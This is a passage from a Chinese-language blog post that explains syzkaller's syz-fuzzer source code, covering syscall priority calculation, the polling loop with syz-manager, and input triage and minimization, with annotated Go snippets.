ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, a.Elem.Name())<br>&#125;<br><span class="hljs-keyword">if</span> _, ok := a.Elem.(*UnionType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, a.Elem.Name())<br>&#125;<br><span class="hljs-keyword">if</span> arr, ok := a.Elem.(*ArrayType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, arr.Elem.Name())<br>&#125;<br><span class="hljs-keyword">case</span> *BufferType:<br><span class="hljs-keyword">switch</span> a.Kind &#123;<br><span class="hljs-keyword">case</span> BufferBlobRand, BufferBlobRange, BufferText, BufferCompressed:<br><span class="hljs-keyword">case</span> BufferString, BufferGlob:<br><span class="hljs-keyword">if</span> a.SubKind != <span class="hljs-string">&quot;&quot;</span> &#123;<br>noteUsage(uses, c, <span class="hljs-number">2</span>, ctx.Dir, fmt.Sprintf(<span class="hljs-string">&quot;str-%v&quot;</span>, a.SubKind))<br>&#125;<br><span class="hljs-keyword">case</span> BufferFilename:<br>noteUsage(uses, c, <span class="hljs-number">10</span>, DirIn, <span class="hljs-string">&quot;filename&quot;</span>)<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown buffer kind&quot;</span>)<br>&#125;<br><span class="hljs-keyword">case</span> *VmaType:<br>noteUsage(uses, c, <span class="hljs-number">5</span>, ctx.Dir, <span class="hljs-string">&quot;vma&quot;</span>)<br><span class="hljs-keyword">case</span> *IntType:<br><span class="hljs-keyword">switch</span> a.Kind &#123;<br><span class="hljs-keyword">case</span> IntPlain, IntRange:<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown int kind&quot;</span>)<br>&#125;<br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>这里大量用到了 <code>noteUsage()</code> 函数，该函数其实就是用来<strong>更新传入的表中 X 到 Y 的权重值</strong>（取最大值）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">noteUsage</span><span class="hljs-params">(uses <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights, c *Syscall, weight <span class="hljs-type">int32</span>, dir Dir, str <span class="hljs-type">string</span>, args ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>id := fmt.Sprintf(str, args...)<br><span class="hljs-keyword">if</span> uses[id] == <span class="hljs-literal">nil</span> &#123;<br>uses[id] = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights)<br>&#125;<br>callWeight := uses[id][c.ID]<br>callWeight.call = c.ID<br><span class="hljs-keyword">if</span> dir != DirOut &#123;<br><span class="hljs-keyword">if</span> weight &gt; uses[id][c.ID].in &#123;<br>callWeight.in = weight<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> weight &gt; uses[id][c.ID].inout &#123;<br>callWeight.inout = weight<br>&#125;<br>uses[id][c.ID] = callWeight<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Step-II-建立-call-to-call-的权重表"><a href="#Step-II-建立-call-to-call-的权重表" class="headerlink" title="Step.II - 建立 call-to-call 的权重表"></a>Step.II - 建立 call-to-call 的权重表</h5><p>现在我们回到 <code>calcStaticPriorities()</code> 中，在完成了资源使用表 <code>uses</code> 的建立之后，接下来会建立 call-to-call 的权重表 <code>prios</code>：</p><ul><li>遍历资源使用表中的每个权重，基于参数方向赋予静态权重值（例如，当 c0 为创建了一个资源的调用，而 c1 为使用该资源的调用，则一个更高的权重将被赋予）</li><li>调用 <code>normalizePrio()</code> 将表中权重值进行标准化</li><li>对于自我系统调用权重进行单独赋值</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go">prios := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> prios &#123;<br>prios[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br>&#125;<br><span class="hljs-keyword">for</span> _, weights := <span class="hljs-keyword">range</span> uses &#123;<br><span class="hljs-keyword">for</span> _, w0 := <span class="hljs-keyword">range</span> weights &#123;<br><span class="hljs-keyword">for</span> _, w1 := <span class="hljs-keyword">range</span> weights &#123;<br><span class="hljs-keyword">if</span> w0.call == w1.call &#123;<br><span class="hljs-comment">// 自身权重在下方赋值.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 静态权重值基于参数方向赋值.当 c0 为创建了一个资源的调用</span><br><span class="hljs-comment">// 而 c1 为使用该资源的调用，则一个更高的权重将被赋予.</span><br>prios[w0.call][w1.call] += w0.inout*w1.in*<span class="hljs-number">3</span>/<span class="hljs-number">2</span> + w0.inout*w1.inout<br>&#125;<br>&#125;<br>&#125;<br>normalizePrio(prios)<br><span class="hljs-comment">// 自身权重值(call wrt itself) 的赋值应当高些, 但不要太高.</span><br><span class="hljs-keyword">for</span> c0, pp := <span class="hljs-keyword">range</span> prios &#123;<br>pp[c0] = prioHigh * <span class="hljs-number">9</span> / <span class="hljs-number">10</span><br>&#125;<br><span class="hljs-keyword">return</span> prios<br>&#125;<br></code></pre></td></tr></table></figure><p>完成基于资源使用的权重值计算之后静态优先级就算计算完毕了：）</p><h4 id="②-calcDynamicPrio-：动态优先级计算"><a href="#②-calcDynamicPrio-：动态优先级计算" class="headerlink" title="② calcDynamicPrio()：动态优先级计算"></a>② calcDynamicPrio()：动态优先级计算</h4><p>动态优先级的计算基于现有的语料库完成，这一部分的代码比较简单，主要是遍历语料库，对于同时出现的系统调用对 X、Y 的优先级值 <code>+1</code>，完成后调用 <code>normalizePrio()</code> 进行标准化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcDynamicPrio(corpus []*Prog) [][]<span class="hljs-type">int32</span> &#123;<br>prios := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> prios &#123;<br>prios[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br>&#125;<br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> corpus &#123;<br><span class="hljs-keyword">for</span> idx0, c0 := <span class="hljs-keyword">range</span> p.Calls &#123;<br><span class="hljs-keyword">for</span> _, c1 := <span class="hljs-keyword">range</span> p.Calls[idx0+<span class="hljs-number">1</span>:] &#123;<br>prios[c0.Meta.ID][c1.Meta.ID]++<br>&#125;<br>&#125;<br>&#125;<br>normalizePrio(prios)<br><span class="hljs-keyword">return</span> prios<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="③-normalizePrio-：优先级值标准化"><a href="#③-normalizePrio-：优先级值标准化" class="headerlink" title="③ normalizePrio()：优先级值标准化"></a>③ normalizePrio()：优先级值标准化</h4><p>这个函数逻辑比较简单，主要就是将权重值标准化到 [prioLow..prioHigh] 范围：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>prioLow  = <span class="hljs-number">10</span><br>prioHigh = <span class="hljs-number">1000</span><br>)<br><br><span class="hljs-comment">// normalizePrio 将权重值标准化到 [prioLow..prioHigh] 范围.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">normalizePrio</span><span class="hljs-params">(prios [][]<span class="hljs-type">int32</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> _, prio := <span class="hljs-keyword">range</span> prios &#123;<br>max := <span class="hljs-type">int32</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> prio &#123;<br><span class="hljs-keyword">if</span> max &lt; p &#123;<br>max = p<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> i, p := <span class="hljs-keyword">range</span> prio &#123;<br>prio[i] = prioLow + p*(prioHigh-prioLow)/max<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="为每个-syz-executor-启动一个协程，正式开始-fuzz"><a href="#为每个-syz-executor-启动一个协程，正式开始-fuzz" class="headerlink" title="为每个 syz-executor 启动一个协程，正式开始 fuzz"></a>为每个 syz-executor 启动一个协程，正式开始 fuzz</h2><p>完成前面的所有准备工作之后，接下来我们终于可以正式开始进行 fuzzing 了，syz-fuzzer 会调用 <code>newProc()</code> 为每个要启动的 syz-executor 创建一个 <code>Proc</code> 实例对象（都存放在 <code>fuzzer.procs</code> 列表中），并<strong>为每个 syz-executor 启动一个新的协程负责具体的 fuzzing 工作</strong>（<code>proc.Loop()</code>）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> r.CoverFilterBitmap != <span class="hljs-literal">nil</span> &#123;<br>fuzzer.execOpts.Flags |= ipc.FlagEnableCoverageFilter<br>&#125;<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;starting %v fuzzer processes&quot;</span>, *flagProcs)<br><span class="hljs-keyword">for</span> pid := <span class="hljs-number">0</span>; pid &lt; *flagProcs; pid++ &#123;<br>proc, err := newProc(fuzzer, pid)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create proc: %v&quot;</span>, err)<br>&#125;<br>fuzzer.procs = <span class="hljs-built_in">append</span>(fuzzer.procs, proc)<br><span class="hljs-keyword">go</span> proc.loop()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最后主线程调用 <code>pollLoop()</code>，循环等待需要 poll 的情况</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">fuzzer.pollLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-pollLooop-：循环等待处理-fuzzing-协程请求，与-syz-manager-通信"><a href="#0x03-pollLooop-：循环等待处理-fuzzing-协程请求，与-syz-manager-通信" class="headerlink" title="0x03. pollLooop()：循环等待处理 fuzzing 协程请求，与 syz-manager 通信"></a>0x03. pollLooop()：循环等待处理 fuzzing 协程请求，与 syz-manager 通信</h1><p>fuzzing 的工作是由协程 <code>proc.loop()</code> 完成的，在继续深入 fuzzing 过程之前我们先来看看主线程最后还会做些什么：）</p><p>主线程在启动这些协程之后所需要做的工作其实就是响应这些协程的请求，并负责与 syz-manager 间进行 RPC 通信，通过一个不会返回的 <code>pollLoop()</code> 函数完成，该函数核心其实就是一个<strong>无限循环</strong>：</p><ul><li>循环等待 <code>ticker</code> （每 3s 响应一次的计时器）或 <code>fuzzer.needPoll</code> 这两个 channel 之一有数据传来</li><li>如果是  <code>fuzzer.needPoll</code> 传来请求或是距离上次 poll 的时间大于 10s：<ul><li>检查 workQueue 是否需要新的 candidate（candidate 数量少于 executor 数量），若不是且本次请求处理为  <code>fuzzer.needPoll</code> 传来请求，则等到到距离上次 poll 的时间大于 10s</li><li>收集 executor 数据，调用 <code>poll()</code> 通过 RPC 向 syz-manager 获取新的 candidate</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go">unc (fuzzer *Fuzzer) pollLoop() &#123;<br><span class="hljs-keyword">var</span> execTotal <span class="hljs-type">uint64</span><br><span class="hljs-keyword">var</span> lastPoll time.Time<br><span class="hljs-keyword">var</span> lastPrint time.Time<br>ticker := time.NewTicker(<span class="hljs-number">3</span> * time.Second * fuzzer.timeouts.Scale).C<br><span class="hljs-keyword">for</span> &#123;<br>poll := <span class="hljs-literal">false</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ticker:<span class="hljs-comment">/* 3s 一次的计时器 */</span><br><span class="hljs-keyword">case</span> &lt;-fuzzer.needPoll: <span class="hljs-comment">/* fuzzing 协程的 poll 请求 */</span><br>poll = <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> fuzzer.outputType != OutputStdout &amp;&amp; time.Since(lastPrint) &gt; <span class="hljs-number">10</span>*time.Second*fuzzer.timeouts.Scale &#123;<br><span class="hljs-comment">// Keep-alive for manager.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;alive, executed %v&quot;</span>, execTotal)<br>lastPrint = time.Now()<br>&#125;<br><span class="hljs-comment">/* 对于计时器而言至少 10s 才 poll 一次 */</span><br><span class="hljs-keyword">if</span> poll || time.Since(lastPoll) &gt; <span class="hljs-number">10</span>*time.Second*fuzzer.timeouts.Scale &#123;<br><span class="hljs-comment">/* workqueue 里 work item 数量少于 executor 数量才 poll */</span><br>needCandidates := fuzzer.workQueue.wantCandidates()<br><span class="hljs-keyword">if</span> poll &amp;&amp; !needCandidates &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>stats := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span>)<br><span class="hljs-keyword">for</span> _, proc := <span class="hljs-keyword">range</span> fuzzer.procs &#123;<br>stats[<span class="hljs-string">&quot;exec total&quot;</span>] += atomic.SwapUint64(&amp;proc.env.StatExecs, <span class="hljs-number">0</span>)<br>stats[<span class="hljs-string">&quot;executor restarts&quot;</span>] += atomic.SwapUint64(&amp;proc.env.StatRestarts, <span class="hljs-number">0</span>)<br>&#125;<br><span class="hljs-keyword">for</span> stat := Stat(<span class="hljs-number">0</span>); stat &lt; StatCount; stat++ &#123;<br>v := atomic.SwapUint64(&amp;fuzzer.stats[stat], <span class="hljs-number">0</span>)<br>stats[statNames[stat]] = v<br>execTotal += v<br>&#125;<br><span class="hljs-keyword">if</span> !fuzzer.poll(needCandidates, stats) &#123;<br>lastPoll = time.Now()<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-proc-loop-：真正负责-fuzzing-的核心协程"><a href="#0x04-proc-loop-：真正负责-fuzzing-的核心协程" class="headerlink" title="0x04. proc.loop()：真正负责 fuzzing 的核心协程"></a>0x04. proc.loop()：真正负责 fuzzing 的核心协程</h1><p>下面我们来到 syz-fuzzer 的另一个核心——<strong>真正的 fuzzing 过程</strong>，syz-fuzzer 会为每个 syz-executor 启动一个新的协程负责具体的 fuzzing 工作（对于 executor 来说相当于督工和不断给任务的上司属于是），该协程对应 <code>proc.loop()</code> 函数，该函数的核心其实还是一个<strong>无限循环</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> loop() &#123;<br>generatePeriod := <span class="hljs-number">100</span><br><span class="hljs-keyword">if</span> proc.fuzzer.config.Flags&amp;ipc.FlagSignal == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 如果我们没有真的覆盖率信号, 更加频繁地生成程序</span><br><span class="hljs-comment">// 因为反馈信号很弱.</span><br>generatePeriod = <span class="hljs-number">2</span><br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br></code></pre></td></tr></table></figure><h2 id="从全局-WorkQueue-中获取输入，分类处理执行"><a href="#从全局-WorkQueue-中获取输入，分类处理执行" class="headerlink" title="从全局 WorkQueue 中获取输入，分类处理执行"></a>从全局 WorkQueue 中获取输入，分类处理执行</h2><p>大循环的核心逻辑之一为不断地从全局 <code>WorkQueue</code> 中获取新的输入，按照其类型不同调用不同的处理函数，完成后又继续下一轮循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go">item := proc.fuzzer.workQueue.dequeue()<br><span class="hljs-keyword">if</span> item != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">switch</span> item := item.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *WorkTriage:<br>proc.triageInput(item)<br><span class="hljs-keyword">case</span> *WorkCandidate:<br>proc.execute(proc.execOpts, item.p, item.flags, StatCandidate)<br><span class="hljs-keyword">case</span> *WorkSmash:<br>proc.smashInput(item)<br><span class="hljs-keyword">default</span>:<br>log.Fatalf(<span class="hljs-string">&quot;unknown work type: %#v&quot;</span>, item)<br>&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="①-proc-triageInput-：执行输入-amp-尝试最小化后发送给-manager-并添加到本地语料库，若未-smash-则添加到-smash-队列"><a href="#①-proc-triageInput-：执行输入-amp-尝试最小化后发送给-manager-并添加到本地语料库，若未-smash-则添加到-smash-队列" class="headerlink" title="① proc.triageInput()：执行输入&amp;尝试最小化后发送给 manager 并添加到本地语料库，若未 smash 则添加到 smash 队列"></a>① proc.triageInput()：执行输入&amp;尝试最小化后发送给 manager 并添加到本地语料库，若未 smash 则添加到 smash 队列</h3><p>该函数用来处理 WorkQueue 中的 WorkTraige，即<strong>可能会提供新覆盖率的程序</strong>：</p><ul><li>一开始先调用 <code>signalPrio()</code> 检查该输入之前执行结果的 <code>errno</code>，为 <code>0</code> 则 <code>prio |= 1 &lt;&lt; 1</code>，同时还会检查是否 <code>item.p</code> 的 <code>target</code> 不包含 <code>item.p.Calls[call]</code> 对应的调用，若是则 <code>prio |= 1 &lt;&lt; 0</code></li><li>判断是否产生了语料库中没有的新信号，若无则直接返回</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> triageInput(item *WorkTriage) &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: triaging type=%x&quot;</span>, proc.pid, item.flags)<br><br>prio := signalPrio(item.p, &amp;item.info, item.call)<br>inputSignal := signal.FromRaw(item.info.Signal, prio)<br>newSignal := proc.fuzzer.corpusSignalDiff(inputSignal)<br><span class="hljs-keyword">if</span> newSignal.Empty() &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>callName := <span class="hljs-string">&quot;.extra&quot;</span><br>logCallName := <span class="hljs-string">&quot;extra&quot;</span><br><span class="hljs-keyword">if</span> item.call != <span class="hljs-number">-1</span> &#123;<br>callName = item.p.Calls[item.call].Meta.Name<br>logCallName = fmt.Sprintf(<span class="hljs-string">&quot;call #%v %v&quot;</span>, item.call, callName)<br>&#125;<br>log.Logf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;triaging input for %v (new signal=%v)&quot;</span>, logCallName, newSignal.Len())<br></code></pre></td></tr></table></figure><p>完成前面的这些判断工作之后，接下来来到一个会运行三次的小循环：</p><ul><li>调用 <code>proc.executeRaw()</code> <strong>将该输入重新执行一次</strong>，若执行失败（这里的 <code>reexecutionSuccess()</code> 主要检查信号长度是否不为 0）则重新开始循环，失败 2次直接返回</li><li>获取执行所得信号与覆盖率，将覆盖率合并到 <code>inputCover</code> 中，如果 <code>rawCover</code> 为空则还会往里边放一份</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> inputCover cover.Cover<br><span class="hljs-keyword">const</span> (<br>signalRuns       = <span class="hljs-number">3</span><br>minimizeAttempts = <span class="hljs-number">3</span><br>)<br><span class="hljs-comment">// 计算输入覆盖与 non-flaky 信号以最小化.</span><br>notexecuted := <span class="hljs-number">0</span><br>rawCover := []<span class="hljs-type">uint32</span>&#123;&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; signalRuns; i++ &#123;<br>info := proc.executeRaw(proc.execOptsCover, item.p, StatTriage)<br><span class="hljs-keyword">if</span> !reexecutionSuccess(info, &amp;item.info, item.call) &#123;<br><span class="hljs-comment">// 调用未被执行或失败了.</span><br>notexecuted++<br><span class="hljs-keyword">if</span> notexecuted &gt; signalRuns/<span class="hljs-number">2</span>+<span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-comment">// 发生得太频繁，放弃</span><br>&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br>thisSignal, thisCover := getSignalAndCover(item.p, info, item.call)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(rawCover) == <span class="hljs-number">0</span> &amp;&amp; proc.fuzzer.fetchRawCover &#123;<br>rawCover = <span class="hljs-built_in">append</span>([]<span class="hljs-type">uint32</span>&#123;&#125;, thisCover...)<br>&#125;<br>newSignal = newSignal.Intersection(thisSignal)<br><span class="hljs-comment">// 没有 !minimized 检查的情况下 manager 在每次重启后开始丢失相当大量的覆盖率.</span><br><span class="hljs-comment">// Mechanics of this are not completely clear.</span><br><span class="hljs-keyword">if</span> newSignal.Empty() &amp;&amp; item.flags&amp;ProgMinimized == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>inputCover.Merge(thisCover)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里这个 <code>Merge()</code> 其实笔者没太看明白 :（</p><p>目前笔者推测 <code>pc</code> 是 <code>program counter</code> ，这样比较能说得通，不过这样为什么不用 <code>map[uint32]bool</code> 呢？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cov *Cover)</span></span> Merge(raw []<span class="hljs-type">uint32</span>) &#123;<br>c := *cov<br><span class="hljs-keyword">if</span> c == <span class="hljs-literal">nil</span> &#123;<br>c = <span class="hljs-built_in">make</span>(Cover)<br>*cov = c<br>&#125;<br><span class="hljs-keyword">for</span> _, pc := <span class="hljs-keyword">range</span> raw &#123;<br>c[pc] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>循环结束后会检查 item 的标志位，如果未设置 <code>ProgMinimized</code> 说明该输入还未进行最小化，<strong>此时调用</strong> <code>prog.Minimize()</code> <strong>将输入进行最小化</strong></p><p>这里传入的闭包函数主要是一个 <code>minimizeAttempts</code> （3）次的小循环，其中会调用 <code>proc.execute()</code> 执行最小化后的程序，执行失败则返回，若三次循环执行中无法再产生新的信号信号则返回 true，否则返回 false</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> item.flags&amp;ProgMinimized == <span class="hljs-number">0</span> &#123;<br>item.p, item.call = prog.Minimize(item.p, item.call, <span class="hljs-literal">false</span>,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p1 *prog.Prog, call1 <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; minimizeAttempts; i++ &#123;<br>info := proc.execute(proc.execOpts, p1, ProgNormal, StatMinimize)<br><span class="hljs-keyword">if</span> !reexecutionSuccess(info, &amp;item.info, call1) &#123;<br><span class="hljs-comment">// The call was not executed or failed.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>thisSignal, _ := getSignalAndCover(p1, info, call1)<br><span class="hljs-keyword">if</span> newSignal.Intersection(thisSignal).Len() == newSignal.Len() &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>最后将这个输入序列化后<strong>发送给 syz-manager 并将其添加到本地语料库中</strong>，如果未设置 <code>ProgSmashed</code> 标志位则再将这个输入放到 WorkSmash 队列中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs 